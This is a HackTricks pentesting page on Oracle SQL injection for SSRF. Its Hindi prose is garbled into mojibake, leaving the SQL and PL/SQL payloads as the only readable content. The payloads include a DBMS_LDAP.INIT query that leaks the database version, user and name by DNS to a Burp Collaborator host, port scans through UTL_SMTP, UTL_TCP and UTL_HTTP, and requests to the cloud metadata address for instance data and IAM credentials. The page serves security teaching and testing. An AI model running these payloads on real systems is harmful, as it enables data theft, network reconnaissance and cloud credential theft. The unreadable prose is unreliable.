# Oracle injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) рд╕реЗ рд╣рдЯрд╛рдП рдЧрдП рдкреЛрд╕реНрдЯ рдХреА рд╡реЗрдм рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЙрдкреА рд╕рд░реНрд╡ рдХрд░реЗрдВред**

## SSRF

Oracle рдХрд╛ рдЙрдкрдпреЛрдЧ Out of Band HTTP рдФрд░ DNS рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдкреНрд░рд▓реЗрдЦрд┐рдд рд╣реИ рд▓реЗрдХрд┐рди SQL рдбреЗрдЯрд╛ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдПрдХ рд╕рд╛рдзрди рдХреЗ рд░реВрдк рдореЗрдВред рд╣рдо рд╣рдореЗрд╢рд╛ рдЗрди рддрдХрдиреАрдХреЛрдВ/рдлрдВрдХреНрд╢рдВрд╕ рдХреЛ рдЕрдиреНрдп SSRF/XSPA рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

Oracle рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рджрд░реНрджрдирд╛рдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдпрджрд┐ рдЖрдк рдХрдорд╛рдВрдб рдЖрдЬрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рддреНрд╡рд░рд┐рдд рдЙрджрд╛рд╣рд░рдг рд╕реЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдореЗрд░реЗ рджреЛрд╕реНрдд рдФрд░ рд╕рд╣рдпреЛрдЧреА [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), рдиреЗ рдореБрдЭреЗ [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд┐рд╕рдиреЗ рдореБрдЭреЗ рдПрдХ t2.large AWS Ubuntu рдорд╢реАрди рдФрд░ Docker рдкрд░ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреАред

рдореИрдВрдиреЗ `--network="host"` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде docker рдХрдорд╛рдВрдб рдЪрд▓рд╛рдпрд╛ рддрд╛рдХрд┐ рдореИрдВ рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреЗ рджреМрд░рд╛рди Oracle рдХреЛ рдкреВрд░реНрдг рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде рдПрдХ рдореВрд▓ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХреВрдВред
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Oracle рдкреИрдХреЗрдЬ рдЬреЛ URL рдпрд╛ Hostname/Port Number рд╡рд┐рдирд┐рд░реНрджреЗрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

рдХрд┐рд╕реА рднреА рдкреИрдХреЗрдЬ рдФрд░ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЛ рдПрдХ рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ рд╡рд┐рдирд┐рд░реНрджреЗрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рдореИрдВрдиреЗ [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html) рдкрд░ рдПрдХ Google рдЦреЛрдЬ рдХреАред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
The search returned the following results (not all can be used to perform outbound network)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

рдпрд╣ рдХрдЪреНрдЪрд╛ рдЦреЛрдЬ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ `DBMS_LDAP` рдЬреИрд╕реЗ рдкреИрдХреЗрдЬреЛрдВ рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ (рдЬреЛ рдПрдХ рд╣реЛрд╕реНрдЯрдирд╛рдо рдФрд░ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ) рдХреНрдпреЛрдВрдХрд┐ [рдбреЙрдХреНрдпреВрдореЗрдВрдЯреЗрд╢рди рдкреГрд╖реНрда](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) рдЖрдкрдХреЛ [рдПрдХ рдЕрд▓рдЧ рд╕реНрдерд╛рди](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) рдкрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЕрдиреНрдп Oracle рдкреИрдХреЗрдЬ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдЙрдЯрдмрд╛рдЙрдВрдб рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдореИрдВрдиреЗ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рдХрд┐рд╕реА рднреА рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдЗрдП рдЙрди рдХреБрдЫ рдкреИрдХреЗрдЬреЛрдВ рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдордиреЗ рдЦреЛрдЬрд╛ рдФрд░ рдКрдкрд░ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рд╣реИред

**DBMS\_LDAP.INIT**

`DBMS_LDAP` рдкреИрдХреЗрдЬ LDAP рд╕рд░реНрд╡рд░реЛрдВ рд╕реЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред `init()` рдлрд╝рдВрдХреНрд╢рди рдПрдХ LDAP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ рд╕рддреНрд░ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рд╣реЛрд╕реНрдЯрдирд╛рдо рдФрд░ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рдПрдХ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЗрддрд╛ рд╣реИред

рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╣рд▓реЗ DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдХреЗ рдирд┐рд╖реНрдХрд░реНрд╖рдг рдХреЛ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджрд╕реНрддрд╛рд╡реЗрдЬрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреИрд╕реЗ рдиреАрдЪреЗ
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рджреЗрдЦрддреЗ рд╣реБрдП рдХрд┐ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдПрдХ рд╣реЛрд╕реНрдЯрдирд╛рдо рдФрд░ рдПрдХ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд░ рдХреА рддрд░рд╣ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣рд╛рдБ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` рдпрд╣ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ рдЬрдмрдХрд┐ рдПрдХ рд╕рддреНрд░ рдорд╛рди рдкреЛрд░реНрдЯ рдХреЛ рдЦреБрд▓рд╛ рджрд┐рдЦрд╛рддрд╛ рд╣реИред

**UTL\_SMTP**

`UTL_SMTP` рдкреИрдХреЗрдЬ SMTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдИ-рдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред [Oracle рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЗрдЯ рдкрд░ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕ рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдИ-рдореЗрд▓ рдХреИрд╕реЗ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478)ред рд╣рдорд╛рд░реЗ рд▓рд┐рдП, рд╣рд╛рд▓рд╛рдВрдХрд┐, рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдПрдХ рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ рд╡рд┐рдирд┐рд░реНрджреЗрд╢рди рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред

рдПрдХ рдХрдЪреНрдЪрд╛ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ `UTL_SMTP.OPEN_CONNECTION` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ 2 рд╕реЗрдХрдВрдб рдХрд╛ рдЯрд╛рдЗрдордЖрдЙрдЯ рд╣реИред
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
A `ORA-29276: transfer timeout` рдпрд╣ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ рд▓реЗрдХрд┐рди рдХреЛрдИ SMTP рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реБрдЖ рдЬрдмрдХрд┐ рдПрдХ `ORA-29278: SMTP transient error: 421 Service not available` рдпрд╣ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИред

**UTL\_TCP**

`UTL_TCP` рдкреИрдХреЗрдЬ рдФрд░ рдЗрд╕рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдФрд░ рдлрд╝рдВрдХреНрд╢рди [рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде TCP/IP рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдЪрд╛рд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ред рдпрджрд┐ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рдкреИрдХреЗрдЬ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдмрди рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдкреВрд░реНрдг рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ TCP/IP рдХрдиреЗрдХреНрд╢рди рдХреЗ рд╕рднреА рдкрд╣рд▓реБрдУрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг [Oracle рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЗрдЯ рдкрд░ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕ рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдЪреНрдЪрд╛ TCP рдХрдиреЗрдХреНрд╢рди рдХреИрд╕реЗ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ред рд╣рдо рдЗрд╕реЗ рдереЛрдбрд╝рд╛ рдФрд░ рд╕рд░рд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдпрд╛ рдХрд┐рд╕реА рдордирдорд╛рдиреЗ TCP/IP рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдХрдЪреНрдЪреЗ TCP рдЕрдиреБрд░реЛрдз рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреЗ рдХрд╛рд░рдг, рдЗрд╕ рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рднреА рдХреНрд▓рд╛рдЙрдб рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ Instance рдореЗрдЯрд╛-рдбреЗрдЯрд╛ рд╕реЗрд╡рд╛ рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╡рд┐рдзрд┐ рдкреНрд░рдХрд╛рд░ рдФрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рд╣реЗрдбрд░ рд╕рднреА TCP рдЕрдиреБрд░реЛрдз рдХреЗ рднреАрддрд░ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**UTL\_HTTP рдФрд░ рд╡реЗрдм рдЕрдиреБрд░реЛрдз**

рд╢рд╛рдпрдж рд╣рд░ Out of Band Oracle SQL Injection рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдореЗрдВ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдФрд░ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдкреНрд░рд▓реЗрдЦрд┐рдд рддрдХрдиреАрдХ [`UTL_HTTP` рдкреИрдХреЗрдЬ](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070) рд╣реИред рдЗрд╕ рдкреИрдХреЗрдЬ рдХреЛ рдкреНрд░рд▓реЗрдЦрди рджреНрд╡рд╛рд░рд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ - `UTL_HTTP рдкреИрдХреЗрдЬ SQL рдФрд░ PL/SQL рд╕реЗ рд╣рд╛рдЗрдкрд░рдЯреЗрдХреНрд╕реНрдЯ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (HTTP) рдХреЙрд▓рдЖрдЙрдЯ рдХрд░рддрд╛ рд╣реИред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдХреБрдЫ рдореМрд▓рд┐рдХ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдкреНрд░рд╢реНрдиреЛрдВ рдХреЗ рд╕рд╛рде
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
A `ORA-12541: TNS:no listener` рдпрд╛ `TNS:operation timed out` рдпрд╣ рд╕рдВрдХреЗрдд рд╣реИ рдХрд┐ TCP рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ, рдЬрдмрдХрд┐ `ORA-29263: HTTP protocol error` рдпрд╛ рдбреЗрдЯрд╛ рдпрд╣ рд╕рдВрдХреЗрдд рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИред

рдПрдХ рдФрд░ рдкреИрдХреЗрдЬ рдЬрд┐рд╕рдХрд╛ рдореИрдВрдиреЗ рдЕрддреАрдд рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕рдлрд▓рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ рд╡рд╣ рд╣реИ [`GETCLOB()` рд╡рд┐рдзрд┐ `HTTPURITYPE` Oracle рдЕрдореВрд░реНрдд рдкреНрд░рдХрд╛рд░ рдХреА](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705) рдЬреЛ рдЖрдкрдХреЛ рдПрдХ URL рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдФрд░ HTTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред `GETCLOB()` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ URL рд╕реЗ GET рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ [CLOB рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) рдХреЗ рд░реВрдк рдореЗрдВ рд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред [select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
